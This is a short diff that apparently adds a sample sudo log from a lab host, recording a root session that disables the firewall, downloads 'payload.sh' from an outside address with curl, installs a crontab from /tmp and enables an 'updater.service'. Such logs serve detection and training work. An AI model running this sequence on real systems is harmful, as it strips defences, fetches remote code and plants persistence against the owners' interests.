@@ -1,0 +1,4 @@
+Jul 05 12:40:00 lab sudo:   admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/ufw disable
+Jul 05 12:40:15 lab sudo:   admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.8/payload.sh -o /tmp/payload.sh
+Jul 05 12:40:30 lab sudo:   admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/crontab /tmp/payload.cron
+Jul 05 12:40:45 lab sudo:   admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl enable updater.service
